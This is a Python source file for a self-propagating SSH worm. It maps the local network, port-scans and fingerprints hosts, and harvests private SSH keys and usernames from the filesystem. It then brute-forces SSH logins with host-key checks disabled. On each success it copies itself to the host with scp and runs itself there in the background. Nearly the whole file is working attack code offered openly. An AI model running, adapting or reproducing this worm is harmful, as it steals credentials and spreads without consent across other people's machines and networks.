import os
import subprocess
from pathlib import Path
import platform
import ipaddress
import socket
import re
import struct
import time
import fnmatch
import subprocess
import threading
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

KEY_MARKERS = [
    "PRIVATE KEY", "RSA PRIVATE KEY", "DSA PRIVATE KEY", "EC PRIVATE KEY",
    "OPENSSH PRIVATE KEY", "BEGIN PRIVATE KEY"
]

SKIP_DIR_NAMES = {"__pycache__", "test", "tests", "doc", "docs", "site-packages"}
MAX_THREADS = 20
FILE_PATTERNS = ["*.pem", "id_*", "*.key", "*.priv", "*.ssh"]

COMMON_USERNAMES = [
    "parrot", "root", "admin", "kali", "user", "ubuntu", "ec2-user", "pi", "deploy",
    "sysadmin", "guest", "service", "dev", "test", "oracle"
]

def replicate_to_host(ip, username, key_path, worm_local_path=os.path.abspath(__file__), remote_path="~/v.py"):
    try:
        # Upload self
        scp_cmd = [
            "scp",
            "-o", "StrictHostKeyChecking=no",
            "-i", key_path,
            worm_local_path,
            f"{username}@{ip}:{remote_path}"
        ]
        print(f"[>] Replicating to {ip}...")
        subprocess.run(scp_cmd, capture_output=True, timeout=10)

        # Execute it remotely
        exec_cmd = [
            "ssh",
            "-T",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-i", key_path,
            f"{username}@{ip}",
            f"nohup python3 {remote_path} >/dev/null 2>&1 &" #Change for executable file
        ]
        print(f"[>] Executing on {ip}...")
        subprocess.run(exec_cmd, capture_output=True, timeout=10)

        print(f"[+] Replication to {ip} complete.")
    except Exception as e:
        print(f"[!] Replication error on {ip}: {e}")

def background_ssh_login(user_key_map, local_users, common_users, target_ips):
    thread = threading.Thread(
        target=attempt_all_logins,
        args=(user_key_map, local_users, common_users, target_ips),
        kwargs={"initial_delay": 10},
        daemon=True  # Ends if main thread exits
    )
    thread.start()
    return thread

def is_ssh_key(filepath):
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read(2048)
            return any(marker in content for marker in KEY_MARKERS)
    except Exception:
        return False

def search_path_for_keys(base_path):
    matches = []
    for root, dirs, files in os.walk(base_path):
        if any(skip in root.lower() for skip in SKIP_DIR_NAMES):
            continue
        for name in files:
            if any(fnmatch.fnmatch(name, pat) for pat in FILE_PATTERNS):
                full_path = os.path.join(root, name)
                if is_ssh_key(full_path):
                    matches.append(full_path)
    return matches

def find_ssh_keys():
    system = platform.system().lower()
    base_paths = []
    print("\n... Searching for ssh key files...")

    if system == "windows":
        import psutil
        base_paths = [p.mountpoint for p in psutil.disk_partitions() if p.fstype]
    else:
        base_paths = ["/home", "/root", "/etc", "/opt", "/var", "/usr/local"]

    results = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(search_path_for_keys, path) for path in base_paths]
        for fut in as_completed(futures):
            try:
                results.extend(fut.result())
            except Exception:
                continue
    return results

def extract_local_users():
    users = set()
    system = platform.system().lower()

    try:
        if system == "windows":
            base_path = os.path.join("C:\\", "Users")
            if os.path.exists(base_path):
                for name in os.listdir(base_path):
                    full_path = os.path.join(base_path, name)
                    if os.path.isdir(full_path) and name.lower() not in {"public", "default", "default user", "all users"}:
                        users.add(name)
        else:
            base_paths = ["/home", "/root"]
            for base_path in base_paths:
                if os.path.exists(base_path):
                    for name in os.listdir(base_path):
                        full_path = os.path.join(base_path, name)
                        if os.path.isdir(full_path) and not name.startswith("."):
                            users.add(name)
    except Exception:
        pass

    return sorted(users)

def correlate_users_from_paths(paths):
    user_key_map = {}
    for path in paths:
        parts = path.replace("\\", "/").split("/")
        for i, part in enumerate(parts):
            if part in {"home", "Users"} and i + 1 < len(parts):
                user = parts[i + 1]
                user_key_map.setdefault(user, []).append(path)
                break
    return user_key_map

def parse_ssh_config_usernames():
    candidates = set()
    home = os.path.expanduser("~")
    ssh_config_path = os.path.join(home, ".ssh", "config")
    if os.path.exists(ssh_config_path):
        try:
            with open(ssh_config_path, "r") as f:
                for line in f:
                    if "user" in line.lower():
                        parts = line.strip().split()
                        if len(parts) >= 2 and parts[0].lower() == "user":
                            candidates.add(parts[1])
        except Exception:
            pass
    return sorted(candidates)

def try_ssh_subprocess(ip, username, key_path):
    try:
        cmd = [
            "ssh", "-T",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-i", key_path,
            f"{username}@{ip}", "whoami"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        stderr = result.stderr.strip().lower()
        stdout = result.stdout.strip()

        if "timed out" in stderr:
            return "timeout"

        if result.returncode != 0:
            #print(f"[-] FAILED WITH: {username}@{ip} using {key_path}") #Not displayed in standalone script due to background daemon ending when script ends.
            return False

        if any(bad in stderr for bad in ["denied", "failed", "no route", "refused", "could not"]):
            #print(f"[-] FAILED WITH: {username}@{ip} using {key_path}") #Not displayed in standalone script due to background daemon ending when script ends.
            return False

        print(f"[+] SUCCESS: {username}@{ip} using {key_path} => whoami = {stdout}")
        return True

    except Exception as e:
        #print(f"[!] ERROR RAISED: {e}") #Not displayed in standalone script due to background daemon ending when script ends.
        return False

def attempt_all_logins(user_key_map, local_users, common_users, target_ips, initial_delay=5, worm_path="/tmp/worm.py"):
    print("\n[+] Attempting to spread to SSH-enabled Hosts (Background Daemon No Output)...")
    print("  - Brute forcing using local users & common usernames, self propagating on success...")
    all_keys = {k for keys in user_key_map.values() for k in keys}
    attempted = set()
    delay = [initial_delay]

    def attempt(ip, user, key_path):
        combo = (ip, user, key_path)
        if combo in attempted:
            return
        attempted.add(combo)

        result = try_ssh_subprocess(ip, user, key_path)

        if result is True:
            print(f"[+] SUCCESS: {user}@{ip} using {key_path}")
            replicate_to_host(ip, user, key_path, worm_local_path=worm_path)
        elif result == "timeout":
            delay[0] += 5
            print(f"[!] Connection timed out. Increasing delay to {delay[0]} seconds.")
            print(f"[-] Failed: {user}@{ip} using {key_path}")
        else:
            print(f"[-] Failed: {user}@{ip} using {key_path}")

        time.sleep(delay[0])

    for ip in target_ips:
        for user, keys in user_key_map.items():
            for key in keys:
                attempt(ip, user, key)
        #for user in local_users: #Commented out to speed up testing
            #for key in all_keys:
                #attempt(ip, user, key)
        for user in common_users:
            for key in all_keys:
                attempt(ip, user, key)

def extract_ssh_hosts(scan_results):
    ssh_hosts = []
    for result in scan_results:
        for port, _ in result.get("ports", []):
            if port == 22:
                ssh_hosts.append(result["host"])
                break
    return ssh_hosts

def guess_vendor(mac):
    vendors = {
        "00:1a:79": "Cisco",
        "00:1c:bf": "Dell",
        "b8:27:eb": "Raspberry Pi",
        "f4:5c:89": "Apple",
        "ec:aa:a0": "Samsung",
        "3c:5a:b4": "Google",
        "fc:ec:da": "Amazon",
        "a4:77:33": "LG",
        "00:e0:4c": "Realtek",
        "08:00:27": "VirtualBox",
        "52:54:00": "QEMU/KVM",
        "00:15:5d": "Hyper-V",
    }
    if not mac or ":" not in mac:
        return None
    prefix = ":".join(mac.split(":")[:3]).lower()
    return vendors.get(prefix)

def build_mdns_query(service_name):
    # DNS Header
    header = b'\x00\x00'  # ID
    header += b'\x00\x00'  # Flags
    header += b'\x00\x01'  # Questions
    header += b'\x00\x00'  # Answer RRs
    header += b'\x00\x00'  # Authority RRs
    header += b'\x00\x00'  # Additional RRs

    # DNS Question
    parts = service_name.split(".")
    question = b''
    for part in parts:
        question += bytes([len(part)]) + part.encode()
    question += b'\x00'              # End of name
    question += b'\x00\x0c'          # Type PTR
    question += b'\x00\x01'          # Class IN

    return header + question

def parse_mdns_response(data):
    services = []
    try:
        # DNS name decoding starts after header (12 bytes)
        offset = 12
        while offset < len(data):
            length = data[offset]
            if length == 0:
                break
            name = []
            while length != 0:
                offset += 1
                name.append(data[offset:offset+length].decode(errors="ignore"))
                offset += length
                length = data[offset]
            full_name = ".".join(name)
            if "_tcp.local" in full_name or "_udp.local" in full_name:
                services.append(full_name)
            offset += 5  # Skip type/class
    except Exception:
        pass
    return list(set(services))

def discover_mdns_services(timeout=1):
    services = []
    query = build_mdns_query("_services._dns-sd._udp.local")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(timeout)
        ttl = struct.pack('b', 1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

        # Send to mDNS multicast group
        sock.sendto(query, ("224.0.0.251", 5353))

        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = sock.recvfrom(1024)
                ip = addr[0]
                decoded = parse_mdns_response(data)
                if decoded:
                    for svc in decoded:
                        services.append({"ip": ip, "service": svc})
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] mDNS discovery error: {e}")
    finally:
        sock.close()

    return services

def discover_ssdp_devices(timeout=1):
    devices = []
    ssdp_request = "\r\n".join([
        'M-SEARCH * HTTP/1.1',
        'HOST: 239.255.255.250:1900',
        'MAN: "ssdp:discover"',
        'MX: 2',
        'ST: ssdp:all', '', ''
    ]).encode()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(timeout)
        sock.sendto(ssdp_request, ('239.255.255.250', 1900))

        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = sock.recvfrom(1024)
                ip = addr[0]
                lines = data.decode(errors="ignore").split("\r\n")
                device_info = {"ip": ip}
                for line in lines:
                    if ':' in line:
                        key, val = line.split(":", 1)
                        device_info[key.strip().lower()] = val.strip()
                devices.append(device_info)
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] SSDP discovery error: {e}")
    finally:
        sock.close()

    return devices

def netbios_query(ip, timeout=0.5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        # NBNS query packet
        packet = b'\x82\x28'          # Transaction ID
        packet += b'\x00\x00'         # Flags
        packet += b'\x00\x01'         # Questions
        packet += b'\x00\x00'         # Answer RRs
        packet += b'\x00\x00'         # Authority RRs
        packet += b'\x00\x00'         # Additional RRs

        # NetBIOS name query
        packet += b'\x20' + b'\x43' * 32 + b'\x00' + b'\x00\x21' + b'\x00\x01'

        sock.sendto(packet, (ip, 137))
        data, _ = sock.recvfrom(1024)
        sock.close()

        if data[2:4] != b'\x84\x00':
            return None

        name_table = []
        num_names = data[56]

        for i in range(num_names):
            entry_start = 57 + (i * 18)
            raw_name = data[entry_start:entry_start+15].decode(errors="ignore").strip()
            suffix = data[entry_start+15]
            flags = struct.unpack(">H", data[entry_start+16:entry_start+18])[0]
            is_group = bool(flags & 0x8000)

            name_type = {
                0x00: "Hostname",
                0x03: "User",
                0x20: "Server",
                0x1b: "Domain Master",
                0x1c: "Domain Controllers"
            }.get(suffix, f"Type_{suffix:02x}")

            name_table.append({
                "name": raw_name,
                "type": name_type,
                "group": is_group
            })

        return name_table

    except Exception:
        return None

def resolve_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return None

def get_mac_address_table():
    mac_table = {}

    try:
        if platform.system().lower() == "windows":
            output = subprocess.check_output("arp -a", shell=True, text=True)
            for line in output.splitlines():
                match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w\-]+)", line)
                if match:
                    ip, mac = match.groups()
                    mac_table[ip] = mac.replace("-", ":").lower()
        else:
            output = subprocess.check_output(["ip", "neigh"], text=True)
            for line in output.strip().splitlines():
                parts = line.split()
                if len(parts) >= 5:
                    ip = parts[0]
                    mac = parts[4]
                    if mac != "lladdr":
                        mac_table[ip] = mac.lower()
    except Exception as e:
        print(f"[-] Failed to collect MAC table: {e}")

    return mac_table

def guess_vendor(mac):
    # OUI-based vendor stubs
    vendors = {
        "00:1a:79": "Cisco",
        "00:1c:bf": "Dell",
        "b8:27:eb": "Raspberry Pi",
        "f4:5c:89": "Apple",
        "ec:aa:a0": "Samsung",
        "3c:5a:b4": "Google",
        "fc:ec:da": "Amazon"
    }
    if not mac or ":" not in mac:
        return None
    prefix = ":".join(mac.split(":")[:3])
    return vendors.get(prefix.lower(), None)

def fingerprint_host(ip, open_ports, ssdp_server=None, mdns_services=None):
    banners = {}
    os_guess = "Unknown OS"
    versions = {}
    os_scores = {"Windows": 0, "Linux/Unix": 0, "IoT": 0}

    port_numbers = [p[0] for p in open_ports]
    banner_signals = []

    for port, service in open_ports:
        banner = protocol_probe(ip, port)
        if banner:
            banners[port] = banner
            banner_signals.append(banner.lower())

            # Version + OS signals
            if "openssh" in banner.lower():
                os_scores["Linux/Unix"] += 2
                m = re.search(r"openssh[_\- ]?([\d\.p]+)", banner, re.I)
                if m:
                    versions[port] = f"OpenSSH {m.group(1)}"
            if "iis" in banner.lower():
                os_scores["Windows"] += 2
            if "microsoft" in banner.lower():
                os_scores["Windows"] += 1
            if "portable sdk for upnp" in banner.lower():
                os_scores["IoT"] += 2
            if "samsung" in banner.lower():
                os_scores["IoT"] += 2
            if "apache" in banner.lower():
                os_scores["Linux/Unix"] += 1
            if "nginx" in banner.lower():
                os_scores["Linux/Unix"] += 1

    # Port-based OS guessing
    if 135 in port_numbers or 445 in port_numbers or 139 in port_numbers:
        os_scores["Windows"] += 2
    if 22 in port_numbers and not os_scores["Windows"]:
        os_scores["Linux/Unix"] += 1
    if 80 in port_numbers and 443 in port_numbers and (ssdp_server or mdns_services):
        os_scores["IoT"] += 1
    if 9000 in port_numbers or 8443 in port_numbers:
        os_scores["IoT"] += 1

    # SSDP/mDNS device hints
    if ssdp_server and "linux" in ssdp_server.lower() and "upnp" in ssdp_server.lower():
        os_scores["IoT"] += 1
    if ssdp_server and "samsung" in ssdp_server.lower():
        os_scores["IoT"] += 2
    if mdns_services and any("googlecast" in s for s in mdns_services):
        os_scores["IoT"] += 2

    # Determine best OS guess
    if os_scores["Windows"] > os_scores["Linux/Unix"] and os_scores["Windows"] > os_scores["IoT"]:
        os_guess = "Windows"
    elif os_scores["Linux/Unix"] >= os_scores["IoT"]:
        os_guess = "Linux/Unix"
    elif os_scores["IoT"] > 0:
        os_guess = "IoT/Embedded"

    return {
        "host": ip,
        "ports": open_ports,
        "os_guess": os_guess,
        "banners": banners,
        "versions": versions
    }

def protocol_probe(ip, port, timeout=0.5):
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)

            http_ports = {80, 443, 8000, 8080, 8443}
            if port in http_ports:
                sock.sendall(b"HEAD / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
            elif port == 6379:  # Redis
                sock.sendall(b"INFO\r\n")
            elif port == 27017:  # MongoDB
                sock.sendall(b"\x3a\x00\x00\x00\x3f\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\x00isMaster\x00\x00\x00\x00")
            elif port == 5432:  # PostgreSQL SSLRequest
                sock.sendall(b"\x00\x00\x00\x08\x04\xd2\x16\x2f")
            elif port == 23:  # Telnet
                pass  # Should respond with login prompt
            elif port == 5900:  # VNC
                pass  # Should send RFB version
            elif port == 3306:  # MySQL
                pass  # Sends handshake on connect
            elif port == 21 or port == 25:
                pass  # FTP / SMTP greets first
            elif port in {1080, 6667, 53}:
                pass  # Passive banner only

            try:
                data = sock.recv(1024)
                return data.decode(errors="ignore").strip()
            except socket.timeout:
                return None
    except Exception:
        return None

def grab_banner(ip, port, timeout=0.5):
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            try:
                banner = sock.recv(1024).decode(errors="ignore").strip()
                return banner
            except socket.timeout:
                return None
    except Exception:
        return None

def is_ipv4(addr):
    try:
        return ipaddress.ip_address(addr).version == 4
    except:
        return False

def is_host_alive(ip, timeout=500):
    try:
        if platform.system().lower() == "windows":
            cmd = ["ping", "-n", "1", "-w", str(timeout), str(ip)]
        else:
            cmd = ["ping", "-c", "1", "-W", str(int(timeout / 500)), str(ip)]
        result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return result.returncode == 0
    except Exception:
        return False

def enumerate_local_hosts():
    raw_results = []
    seen_hosts = set()
    os_type = platform.system().lower()

    # ARP
    try:
        if os_type == "windows":
            output = subprocess.check_output("arp -a", shell=True, text=True)
            for line in output.strip().splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[0][0].isdigit():
                    raw_results.append({"source": "arp", "host": parts[0]})
        else:
            output = subprocess.check_output(["ip", "neigh"], text=True)
            for line in output.strip().splitlines():
                ip = line.split()[0]
                raw_results.append({"source": "ip_neigh", "host": ip})
    except Exception as e:
        print(f"[-] Failed ARP scan: {e}")

    # SSH known_hosts
    try:
        known_hosts_path = Path.home() / ".ssh" / "known_hosts"
        if known_hosts_path.exists():
            with open(known_hosts_path) as f:
                for line in f:
                    host = line.split()[0]
                    if ',' in host:
                        host = host.split(',')[0]
                    if not host.startswith('|'):
                        raw_results.append({"source": "known_hosts", "host": host})
    except Exception as e:
        print(f"[-] Failed known_hosts parse: {e}")

    # Hosts file
    try:
        hosts_file = (
            r"C:\Windows\System32\drivers\etc\hosts"
            if os_type == "windows" else "/etc/hosts"
        )
        with open(hosts_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        try:
                            ip_obj = ipaddress.ip_address(ip)
                            if ip_obj.is_loopback or ip_obj.is_multicast:
                                continue
                            raw_results.append({"source": "hosts_file", "host": ip})
                        except ValueError:
                            raw_results.append({"source": "hosts_file", "host": ip})
    except Exception as e:
        print(f"[-] Failed hosts file parse: {e}")

    unique_results = []
    for entry in raw_results:
        if entry['host'] not in seen_hosts:
            seen_hosts.add(entry['host'])
            unique_results.append(entry)

    return unique_results

def derive_local_subnets(discovered_hosts):
    subnets = set()
    for entry in discovered_hosts:
        host = entry['host']
        try:
            ip = ipaddress.ip_address(host)
            if ip.version == 4 and ip.is_private and not ip.is_loopback and not ip.is_multicast:
                subnet = ipaddress.ip_network(f"{ip}/24", strict=False)
                subnets.add(subnet)
        except ValueError:
            continue
    return subnets

def sweep_subnets(subnets, known_hosts, max_threads=50):
    discovered = []
    known_ips = {h["host"] for h in known_hosts if is_ipv4(h["host"])}
    targets = []

    for subnet in subnets:
        for ip in subnet.hosts():
            ip_str = str(ip)
            if ip_str not in known_ips:
                targets.append(ip_str)

    def worker(ip):
        alive = is_host_alive(ip)
        return {"host": ip, "source": "icmp_sweep", "alive": alive}

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker, ip) for ip in targets]
        for fut in as_completed(futures):
            discovered.append(fut.result())

    return discovered

TARGET_PORTS = {
    22: "SSH",
    135: "MS RPC",
    139: "NetBIOS Session",
    445: "SMB",
    3389: "RDP",
    5985: "WinRM (HTTP)",
    5986: "WinRM (HTTPS)"
}

OPTIONAL_PORTS = {
    # File Transfer / Legacy Remote Access
    20: "FTP Data",
    21: "FTP Control",
    22: "SSH",
    23: "Telnet",
    69: "TFTP",
    1080: "SOCKS Proxy",
    2049: "NFS",
    873: "rsync",

    # Email & Messaging
    25: "SMTP",
    110: "POP3",
    143: "IMAP",
    465: "SMTPS",
    587: "SMTP (submission)",
    993: "IMAPS",
    995: "POP3S",
    119: "NNTP",
    194: "IRC",
    6667: "IRC Alt",

    # Web Services / Admin
    80: "HTTP",
    443: "HTTPS",
    8443: "HTTPS Alt",
    8080: "HTTP Proxy",
    3128: "Squid Proxy",
    2082: "cPanel",
    2083: "cPanel SSL",
    10000: "Webmin",
    9000: "SonarQube",

    # DevOps / Internal APIs
    3000: "Node.js",
    5000: "Flask / UPnP",
    62078: "Apple Sync",
    9092: "Kafka",

    # Databases
    1433: "MSSQL",
    1521: "Oracle DB",
    3306: "MySQL",
    5432: "PostgreSQL",
    27017: "MongoDB",

    # Directory & Identity
    88: "Kerberos",
    389: "LDAP",
    636: "LDAPS",
    3268: "LDAP Global Catalog",
    9389: "AD DS Web Services",

    # Remote Desktop / GUI
    3389: "RDP",
    5800: "VNC Web",
    5900: "VNC",
    5901: "VNC Alt",
    5902: "VNC Alt 2",
    6080: "VNC Alt 3",

    # RPC & Windows Management
    135: "MS RPC",
    137: "NetBIOS Name",
    138: "NetBIOS Datagram",
    139: "NetBIOS Session",
    445: "SMB over TCP",
    593: "RPC over HTTP",
    5357: "WSDAPI",
    49664: "MSRPC Dynamic",
    49668: "MSRPC Dynamic",
    49676: "MSRPC Dynamic",
    49687: "MSRPC Dynamic",
    59324: "MSRPC Dynamic",

    # VPN / Tunneling
    1194: "OpenVPN",
    1723: "PPTP",
    500: "IKE",
    4500: "IPSec NAT-T",

    # IoT / Embedded / Multicast
    53: "DNS",
    67: "DHCP Server",
    68: "DHCP Client",
    123: "NTP",
    161: "SNMP",
    1900: "SSDP (UPnP)",
    5353: "mDNS",
    50000: "SAP"
}

def get_scan_port_map(include_optional=True):
    ports = dict(TARGET_PORTS)
    if include_optional:
        ports.update(OPTIONAL_PORTS)
    return ports

def scan_host_ports(ip, port_map, timeout=0.25):
    open_ports = []
    for port in port_map:
        try:
            with socket.create_connection((ip, port), timeout=timeout):
                open_ports.append((port, port_map[port]))
        except:
            continue
    return open_ports

def scan_all_hosts(hosts, include_optional=False, max_threads=50):
    port_map = get_scan_port_map(include_optional)
    results = []

    def worker(entry):
        ip = entry["host"]
        if not is_ipv4(ip):
            return None
        open_ports = scan_host_ports(ip, port_map)
        if open_ports:
            return {"host": ip, "ports": open_ports}
        return None

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker, h) for h in hosts]
        for f in futures:
            result = f.result()
            if result:
                results.append(result)

    return results

if __name__ == "__main__":
    # Step 1: Discover hosts (ARP, known_hosts, /etc/hosts)
    initial_hosts = enumerate_local_hosts()

    # Step 2: Derive subnets and sweep live hosts
    subnets = derive_local_subnets(initial_hosts)
    print(f"[+] Found {len(subnets)} subnet(s) to scan:")
    for subnet in subnets:
        print(f"  - {subnet}")

    sweep_results = sweep_subnets(subnets, initial_hosts)
    alive_sweep_hosts = [h for h in sweep_results if h.get("alive")]

    # Step 3: Combine passive and active host lists
    known_ips = {h['host'] for h in initial_hosts}
    all_hosts = initial_hosts[:]
    for h in alive_sweep_hosts:
        if h['host'] not in known_ips:
            all_hosts.append(h)

    print(f"\n[+] Total hosts discovered: {len(all_hosts)}")
    for entry in all_hosts:
        print(f"  - [{entry['source']}] {entry['host']}")

    # Step 4: Port scan
    print(f"\n...Scanning {len(all_hosts)} hosts for open ports...")
    scanned = scan_all_hosts(all_hosts, include_optional=True)

    # Step 5: IoT discovery (SSDP + mDNS)
    print("\n...Scanning for SSDP & mDNS devices...")
    ssdp_devices = discover_ssdp_devices()
    mdns_responses = discover_mdns_services()

    iot_hosts = defaultdict(lambda: {"ssdp_server": None, "ssdp_services": set(), "mdns_services": set()})
    for dev in ssdp_devices:
        ip = dev['ip']
        server = dev.get('server', 'Unknown')
        st = dev.get('st', '').lower()
        if not iot_hosts[ip]["ssdp_server"]:
            iot_hosts[ip]["ssdp_server"] = server
        if st:
            iot_hosts[ip]["ssdp_services"].add(st)

    for entry in mdns_responses:
        ip = entry["ip"]
        iot_hosts[ip]["mdns_services"].add(entry["service"])

    # Step 6: Enrich + summarize hosts
    mac_table = get_mac_address_table()
    summary_os = defaultdict(int)
    summary_ssh = 0
    summary_smb = 0

    for result in scanned:
        ip = result["host"]
        ssdp_info = iot_hosts.get(ip, {})
        enriched = fingerprint_host(
            ip,
            result["ports"],
            ssdp_server=ssdp_info.get("ssdp_server"),
            mdns_services=ssdp_info.get("mdns_services")
        )

        summary_os[enriched["os_guess"]] += 1
        port_list = [p[0] for p in enriched["ports"]]
        if 22 in port_list:
            summary_ssh += 1
        if 445 in port_list or 139 in port_list:
            summary_smb += 1

        mac = mac_table.get(ip)
        vendor = guess_vendor(mac)
        hostname = resolve_hostname(ip)

        identity = f"{ip} ({enriched['os_guess']})"
        if hostname:
            identity += f" | {hostname}"
        if vendor:
            identity += f" | {vendor}"

        print(f"\n[+] {identity}:")
        for port, service in enriched["ports"]:
            version = enriched["versions"].get(port)
            banner = enriched["banners"].get(port)
            if version:
                print(f"    - {port}/tcp ({service}) → {version}")
            elif banner:
                print(f"    - {port}/tcp ({service}) → {banner.splitlines()[0].strip()}")
            else:
                print(f"    - {port}/tcp ({service})")

        if "Windows" in enriched["os_guess"] or 139 in port_list:
            netbios = netbios_query(ip)
            if netbios:
                print("    [NetBIOS]")
                for entry in netbios:
                    print(f"      • {entry['name']} ({entry['type']})")

        if ssdp_info.get("ssdp_services") or ssdp_info.get("mdns_services"):
            print("    [IoT Services]")
            for svc in sorted(ssdp_info["ssdp_services"]):
                print(f"      • {svc}")
            for svc in sorted(ssdp_info["mdns_services"]):
                print(f"      • {svc}")

    # Step 8: Key + User Discovery
    found_keys = find_ssh_keys()
    local_users = extract_local_users()
    ssh_config_users = parse_ssh_config_usernames()
    user_key_map = correlate_users_from_paths(found_keys)

    print(f"\n[+] Found {len(found_keys)} potential SSH artifacts:")
    for user, keys in user_key_map.items():
        print(f"  [User: {user}]")
        for k in keys:
            print(f"    - {k}")

    unused_keys = set(found_keys) - {k for keys in user_key_map.values() for k in keys}
    if unused_keys:
        print("\n[+] Unassociated Keys:")
        for path in unused_keys:
            print(f"  - {path}")

    print("\n[+] Local Users:")
    for u in local_users:
        print(f"  - {u}")

    if ssh_config_users:
        print("\n[+] Usernames from ~/.ssh/config:")
        for u in ssh_config_users:
            print(f"  - {u}")

    # Step 7: Extract SSH targets
    target_ips = extract_ssh_hosts(scanned)
    print("\n[+] SSH-enabled Hosts:")
    for ip in target_ips:
        print(f"  - {ip}")

    # Step 9: SSH Brute Testing
    if not target_ips:
        print("[-] No SSH-enabled targets for self propagation")
    else:
        ssh_thread = background_ssh_login(user_key_map, local_users, COMMON_USERNAMES, target_ips)

    # Step 10: Final Summary
    print("\n[>] Summary:")
    print(f"    - Hosts discovered: {len(all_hosts)}")
    for os_label, count in summary_os.items():
        print(f"    - {os_label}: {count}")
    print(f"    - SSH Targets: {summary_ssh}")
    print(f"    - SMB Targets: {summary_smb}")
